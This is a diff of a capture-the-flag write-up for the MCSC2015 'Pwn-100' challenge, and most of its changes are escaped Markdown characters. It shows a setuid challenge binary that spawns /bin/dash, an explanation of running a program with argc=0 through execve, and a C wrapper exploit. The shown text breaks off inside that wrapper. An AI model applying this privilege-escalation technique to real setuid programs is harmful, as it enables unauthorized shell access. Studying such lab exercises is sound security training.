@@ -1,4 +1,7 @@
-# MCSC2015 writeup for Pwn-100
+\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#
+MCSC2015 writeup for Pwn-100
+\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#
+
 pwn0@MCSC2015:/challenges/pwn0$ ls -l
 total 16
 -rws--s--x 1 pwned0 pwned0 7492 mai   18 15:13 0
@@ -30,7 +33,7 @@ if(reg == 78954)
 	printf("You Win\n");
 	system("/bin/dash");
 }
-
+\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#
 Step1 : run a program with argc=0
 What's special about the family exec call system ?
 execve allows you to specify the command-line arguments (including the program name).
@@ -40,19 +43,19 @@ execve("/home/xxx/prog",NULL,NULL) would be a little bit different .... argc is 
 
 with that said, let's start exploiting .....
 First, we write a small program 
-
-\#include <stdio.h>
-\#include <stdlib.h>
+\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#
+\#include \<stdio.h>
+\#include \<stdlib.h>
 int main()
 {
 	execve("/challenges/pwn0/0",NULL,NULL);
 }
-############################
+\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#
 pwn0@MCSC2015:/tmp$ mkdir /tmp/testing
 pwn0@MCSC2015:/tmp$ cd /tmp/testing/
 pwn0@MCSC2015:/tmp/testing$ cat wrapper.c
-#include <stdio.h>
-#include <stdlib.h>
+\#include \<stdio.h>
+\#include \<stdlib.h>
 int main()
 {
 	execve("/challenges/pwn0/0",NULL,NULL);
